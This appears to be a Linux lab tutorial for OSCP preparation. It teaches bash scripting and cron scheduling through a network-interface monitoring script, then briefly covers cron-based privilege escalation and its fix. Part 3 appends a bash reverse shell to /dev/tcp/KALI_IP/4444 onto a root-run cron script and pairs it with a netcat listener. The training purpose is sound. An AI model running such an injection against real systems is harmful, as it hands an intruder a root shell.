# Lab: Linux Fundamentals — Cronjobs, NIC Monitoring, and Scripting

## Objective

Learn how to create bash scripts, set up cronjobs, and automate system monitoring. These skills are essential for both administering systems and understanding how attackers abuse them during privilege escalation.

## What You'll Practice

- Writing bash scripts
- Understanding cron syntax
- Setting up recurring scheduled tasks
- Monitoring network interfaces
- Reading and understanding cron-based privilege escalation vectors

---

## Part 1: Write the NIC Monitoring Script

### On any of your Linux VMs (Debian, CentOS, or Ubuntu — pick one)

First, understand what you're capturing. Run this to see your network interfaces:

```bash
ip a
```

**What you see:**

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.244.132/24 brd 192.168.244.255 scope global ens33
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 172.16.0.1/24 brd 172.16.0.255 scope global ens224
```

Each interface has a name (`ens33`, `ens224`), an IP address, and status info. Your script will capture this output on a schedule.

### Create the script

```bash
sudo mkdir -p /opt/scripts
sudo nano /opt/scripts/nic_monitor.sh
```

Type this into the file:

```bash
#!/bin/bash

# NIC monitoring script
# Captures the state of a specific network interface every time it runs
# Output goes to a log file with timestamps

# Configuration — change this to match YOUR interface name
INTERFACE="ens33"
LOGFILE="/var/log/nic_monitor.log"

# Get the current timestamp
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

# Write a header with the timestamp
echo "===== NIC Status: $TIMESTAMP =====" >> "$LOGFILE"

# Capture the interface info
ip a show "$INTERFACE" >> "$LOGFILE"

# Add a blank line between entries for readability
echo "" >> "$LOGFILE"
```

Save and exit (`Ctrl+X`, then `Y`, then `Enter` in nano).

### Understanding each line

```bash
#!/bin/bash
```
The **shebang line**. Tells the system to execute this file using bash. Without it, the system might try to run it with a different shell or not at all.

```bash
INTERFACE="ens33"
```
A **variable assignment**. Stores the interface name so you only need to change it in one place. Replace `ens33` with your actual interface name from `ip a`.

```bash
LOGFILE="/var/log/nic_monitor.log"
```
Where the output goes. `/var/log/` is the standard directory for log files on Linux.

```bash
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
```
**Command substitution** — `$(command)` runs the command and stores the output. `date '+%Y-%m-%d %H:%M:%S'` produces something like `2026-07-31 14:30:00`.

```bash
echo "===== NIC Status: $TIMESTAMP =====" >> "$LOGFILE"
```
Writes a header to the log file. `>>` means **append** (add to the end). A single `>` would **overwrite** the file each time — you'd lose all previous entries.

```bash
ip a show "$INTERFACE" >> "$LOGFILE"
```
Runs `ip a show ens33` and appends the output to the log file.

### Make the script executable

```bash
sudo chmod +x /opt/scripts/nic_monitor.sh
```

`chmod +x` adds the **execute permission**. Without it, you can read the file but can't run it.

### Test the script manually

```bash
sudo /opt/scripts/nic_monitor.sh

# Check the output
cat /var/log/nic_monitor.log
```

You should see something like:

```
===== NIC Status: 2026-07-31 14:30:00 =====
2: ens33: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:xx:xx:xx brd ff:ff:ff:ff:ff:ff
    inet 192.168.244.132/24 brd 192.168.244.255 scope global ens33
       valid_lft forever preferred_lft forever
    inet6 fe80::xxxx:xxxx:xxxx:xxxx/64 scope link
       valid_lft forever preferred_lft forever
```

Run it again and check the log — the second run should be appended below the first.

---

## Part 2: Set Up the Cronjob

### Understanding cron syntax

```
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week  (0-7, 0 and 7 are Sunday)
│ │ │ └──── Month        (1-12)
│ │ └────── Day of month  (1-31)
│ └──────── Hour          (0-23)
└────────── Minute        (0-59)
```

**Examples:**

```
* * * * *           Every minute
*/3 * * * *         Every 3 minutes         ← what you want
0 * * * *           Every hour (at minute 0)
0 0 * * *           Every day at midnight
30 6 * * 1-5        6:30 AM, Monday through Friday
0 0 1 * *           First day of every month at midnight
```

The `*/3` syntax means "every 3rd minute." The `/` means "every Nth."

### Create the cronjob

There are two ways to create cron jobs. Both work — understand both because you'll see both on the OSCP.

#### Method 1: User crontab (using `crontab -e`)

```bash
crontab -e
```

This opens YOUR user's crontab in an editor. Add this line at the bottom:

```
*/3 * * * * /opt/scripts/nic_monitor.sh
```

Save and exit. The job runs as YOUR user every 3 minutes.

**Verify it's saved:**

```bash
crontab -l
```

You should see your entry. 

**Problem:** If the logfile is in `/var/log/` and your user doesn't have write permission, the script will fail silently. Either:
- Change the logfile path to somewhere your user can write (like `/tmp/nic_monitor.log`)
- Or use method 2 to run it as root

#### Method 2: System crontab (using /etc/cron.d/)

This runs the job as root and lets you specify the user:

```bash
echo "*/3 * * * * root /opt/scripts/nic_monitor.sh" | sudo tee /etc/cron.d/nic_monitor
```

**Breaking this down:**

```
*/3 * * * *          Every 3 minutes
root                 Run as the root user
/opt/scripts/nic_monitor.sh    The script to run
```

Files in `/etc/cron.d/` are system cron jobs. They have one extra field compared to user crontabs — the username between the time and the command.

### Verify the cronjob is working

Wait 3-6 minutes, then check the log:

```bash
cat /var/log/nic_monitor.log
```

You should see multiple entries, each 3 minutes apart. If you see only the original test entry, the cron isn't working. Debug:

```bash
# Check cron is running
sudo systemctl status cron        # Debian/Ubuntu
sudo systemctl status crond       # CentOS

# Check cron logs
grep CRON /var/log/syslog         # Debian/Ubuntu
grep CRON /var/log/cron           # CentOS

# Common issues:
# - Script isn't executable (chmod +x)
# - Path issues (cron has a minimal PATH — use full paths in scripts)
# - Permission issues (can't write to the logfile)
```

### Monitor in real time

```bash
# Watch the log file grow
tail -f /var/log/nic_monitor.log
```

`tail -f` follows the file — new lines appear automatically as they're written. Press `Ctrl+C` to stop watching.

---

## Part 3: Why This Matters for the OSCP

### Attacking writable cron scripts

On the OSCP, you'll look for cron jobs running as root where you can modify the script:

```bash
# Find system cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Check if any scripts are writable
ls -la /opt/scripts/nic_monitor.sh
# -rwxrwxrwx = world writable = PRIVESC OPPORTUNITY
```

If the script is writable and runs as root:

```bash
# Inject a reverse shell
echo 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1' >> /opt/scripts/nic_monitor.sh

# On Kali: nc -lvnp 4444
# Wait 3 minutes — root shell arrives
```

### Defending against this

```bash
# Make the script owned by root and only writable by root
sudo chown root:root /opt/scripts/nic_monitor.sh
sudo chmod 755 /opt/scripts/nic_monitor.sh
# rwxr-xr-x = owner can write, everyone else can only read and execute
```

### Cleanup

```bash
# Remove the cron job
sudo rm /etc/cron.d/nic_monitor
# or
crontab -e   # delete the line

# Remove the script and log
sudo rm /opt/scripts/nic_monitor.sh
sudo rm /var/log/nic_monitor.log
```

---

## Part 4: Enhanced version — monitor multiple interfaces

Upgrade the script to monitor all your interfaces:

```bash
#!/bin/bash

LOGFILE="/var/log/nic_monitor.log"
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

echo "===== Full NIC Status: $TIMESTAMP =====" >> "$LOGFILE"

# Loop through all non-loopback interfaces
for IFACE in $(ip -o link show | awk -F': ' '{print $2}' | grep -v lo); do
    echo "--- $IFACE ---" >> "$LOGFILE"
    ip a show "$IFACE" >> "$LOGFILE"
    echo "" >> "$LOGFILE"
done

echo "========================================" >> "$LOGFILE"
echo "" >> "$LOGFILE"
```

**What the for loop does:**

```bash
ip -o link show              # list all interfaces (one per line)
awk -F': ' '{print $2}'      # extract just the interface name
grep -v lo                   # exclude loopback
```

This gives you `ens33 ens224` (or whatever your interfaces are). The `for` loop runs through each one and captures its info.
